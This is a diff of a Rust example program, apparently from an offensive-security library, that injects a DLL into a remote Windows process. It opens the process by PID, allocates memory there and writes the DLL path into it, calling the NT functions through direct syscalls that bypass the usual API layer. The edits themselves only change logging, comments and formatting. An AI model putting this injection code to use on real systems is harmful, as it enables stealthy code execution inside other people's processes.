@@ -6,25 +6,20 @@ use std::ffi::c_void;
 use std::ops::Not;
 use std::path::{Path, PathBuf};
 use std::ptr::null;
-use thermite::{debug, error, info, syscall};
 
-// use thermite::{debug, syscall};
+use thermite::{debug, error, info, syscall};
 use thermite::models::windows::nt_status::NtStatus;
 use thermite::peb_walk::{get_function_address, get_module_address};
-// Only needed for printing the status after each syscalls use thermite::models::windows::peb_teb::UNICODE_STRING;
 
-// Don't forget #[repr(C)] !
 
 #[repr(C)]
 #[derive(Clone, Debug, Copy)]
 pub struct ObjectAttributes {
 	length: u32,
 	root_directory: isize,
-	//Handle,
 	object_name: *const c_void,
 	attributes: u32,
 	security_descriptor: *const c_void,
-	//CVoid,
 	security_quality_of_service: *const c_void,
 }
 
@@ -49,18 +44,12 @@ const STANDARD_RIGHTS_REQUIRED: u32 = 0x00100000u32;
 const PROCESS_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
 
 
-////
-///        UTILITY FUNCTIONS
-////
-
-// Helps us handle the values returned by the syscalls, transmutes the int32 into an actual NT_STATUS
-//
-// It's just for quality of life during debugging, the program can work just as well without it
+// Utility function that handles the return value of syscalls and quits if it's not a success
 fn print_status(str: &str, x: i32) -> NtStatus {
 	let nt_status: NtStatus = unsafe { mem::transmute(x) };
 	match nt_status {
 		NtStatus::StatusSuccess => {
-			info!(format!("{}: {}", str, nt_status))
+			info!("{}: {}", str, nt_status);
 		}
 		_ => {
 			error!(nt_status);
@@ -97,19 +86,20 @@ fn main() {
 
 	// We also perform additional checks to make sure the path is correct
 	if dll.is_file().not()
-	|| dll.is_absolute().not()
-	|| dll.extension().is_some_and(|ext| {ext.eq_ignore_ascii_case("dll")}).not () {
+		|| dll.is_absolute().not()
+		|| dll.extension().is_some_and(|ext| { ext.eq_ignore_ascii_case("dll") }).not() {
 		error!("Please provide an absolute path to a valid DLL file.");
 		process::exit(NtStatus::StatusAssertionFailure as _);
 	}
 
+	// Run the actual injector
 	injector(pid, dll.to_str().unwrap());
 }
 
 
 ///
-/// The function below demonstrate how to inject a DLL in a remote process.
-/// It takes a PID of the target process as argument
+/// The function below demonstrate how to inject a DLL in a remote process using direct syscalls
+/// Arguments: PID of the target process and the absolute path to the DLL to inject
 fn injector(pid: u32, dll_path: &str) {
 	// Declaring structures we're going to need
 	let mut thread_handle: isize = 0;
@@ -137,9 +127,6 @@ fn injector(pid: u32, dll_path: &str) {
 	);
 	print_status("NtOpenProcess", nt_status);
 
-	// debug!("Successfully opened target process";process_handle;);
-	// debug!(dll_path.to_str().unwrap().len());
-
 	let mut buf_size: usize = dll_path.len();
 	let mut base_addr: *mut c_void = 0u32 as _;
 	// process::exit(1);
@@ -152,9 +139,8 @@ fn injector(pid: u32, dll_path: &str) {
 	    MEM_COMMIT | MEM_RESERVE, // [in]      ULONG    AllocationType,
 	    PAGE_READWRITE,           // [in]      ULONG    Protect
 	);
-	print_status("NtAllocateVirtualMemory status:", nt_status);
-	println!("[^-^] Allocated {buf_size} bytes of memory at address {base_addr:#x?}");
-	// [^-^] Allocated 4096 bytes of memory at address 0x00000XXXXXXXXXXX
+	print_status("NtAllocateVirtualMemory", nt_status);
+	info!("Allocated {} bytes of memory at address {:#x?}", buf_size, base_addr);
 
 	// Copy the DLL Path to newly allocated memory
 	let mut bytes_written: usize = 0;
@@ -168,7 +154,7 @@ fn injector(pid: u32, dll_path: &str) {
 	);
 	print_status("NtWriteVirtualMemory", nt_status);
 
-	println!("[^-^] Successfully written {buf_size} bytes in remote memory");
+	info!("Successfully written {} bytes in remote memory", buf_size);
 
 	// Change protection status of allocated memory to READ+EXECUTE
 	// let mut bytes_written = POP_CALC.len();
